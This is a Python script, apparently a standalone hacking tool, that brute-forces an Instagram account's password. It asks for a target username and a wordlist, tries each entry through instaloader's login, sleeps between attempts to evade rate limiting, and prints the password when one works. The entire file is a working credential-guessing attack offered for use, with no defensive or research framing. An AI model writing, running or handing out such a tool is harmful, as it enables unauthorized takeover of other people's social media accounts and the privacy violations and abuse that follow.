import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from defbf import *
os.system("clear")
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
start()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input('\nEnter Instagram Username to bruteforce: ')
    wl = input("\nEnter world list name: ")
    sleepp = int(input("\nInsert sleep time for login [Raccomanded 900(15min)]: "))
    while True:
        sub.call("clear")
        procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
        if procedere == "y":
            veri_break = "si"
            break
        elif procedere == "modify":
            print("\nReturn...")
            break
        elif procedere == "break":
            exit()
        else:
            pass



file1 = open(wl, 'r')
Lines = file1.readlines() 
count = 0



for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(1)
        print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
        L.login(USER , PASSWORD)
        print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
        break
    except instaloader.exceptions.BadCredentialsException:
        pass
        print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
        print("sleep for "+ str(sleepp))
        time.sleep(sleepp)

    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
        break

    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)

